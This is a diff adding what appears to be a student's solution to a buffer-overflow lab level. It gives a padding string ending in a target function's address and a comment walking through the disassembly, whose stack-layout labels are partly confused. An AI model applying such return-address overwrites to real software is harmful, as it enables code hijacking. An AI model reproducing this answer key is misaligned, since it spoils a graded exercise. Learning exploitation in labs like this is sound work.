@@ -1,0 +1,32 @@
+/* Answer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 18 8c 04 08
+
+/* Explain
+ * disassemble getbuf function, found:
+ *     -0x28(%ebp), %eax //The input size
+ *     mov %eax, (%esp)
+ *     call 8048cfa <Gets>
+ *     mov $0x1, %eax
+ *     leave
+ *     ret
+ * we can know that the buffer size is:
+ * 0x28(40) + <main>retaddr(4) + %esp(4) = 48
+ * look at the disassemble smoke function, found:
+ *     push %ebp
+ *     mov %esp, %ebp
+ * know that we can call smoke by %esp address
+ * we just need to write the smoke function's address below the buffer size and retaddr directly:
+ * so the final answer is:
+ * 
+ *    00 00 00 00 00 00 00 00
+ *    00 00 00 00 00 00 00 00
+ *    00 00 00 00 00 00 00 00
+ *    00 00 00 00 00 00 00 00
+ *    00 00 00 00 00 00 00 00
+ *    00 00 00 00 18 8c 04 08 // the smoke function's address
+ */
